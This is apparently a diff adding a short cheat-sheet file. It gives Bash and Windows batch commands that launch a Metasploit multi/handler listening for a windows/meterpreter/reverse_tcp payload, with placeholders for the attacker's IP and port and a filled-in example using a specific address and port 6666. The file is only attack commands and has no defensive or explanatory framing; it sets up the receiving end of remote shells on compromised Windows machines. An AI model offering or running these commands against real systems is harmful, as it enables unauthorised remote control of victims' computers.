@@ -1,0 +1,19 @@
+### Bash ###
+
+```
+
+#!/bin/sh
+msfcli3 exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=[YOURIP] LPORT=[PORT] E
+```
+
+
+### Windows Batch ###
+```
+ruby.exe msfcli exploit/multi/handler LHOST=[YOURIP] LPORT=[PORT] PAYLOAD=windows/meterpreter/reverse_tcp E
+```
+
+i.e.
+
+```
+"D:\Program Files\Metasploit\Framework3\bin\ruby.exe" "D:\Documents and Settings\UserXP\Application Data\msf32\msfcli" exploit/multi/handler LHOST=12.12.12.72 LPORT=6666 PAYLOAD=windows/meterpreter/reverse_tcp E
+```
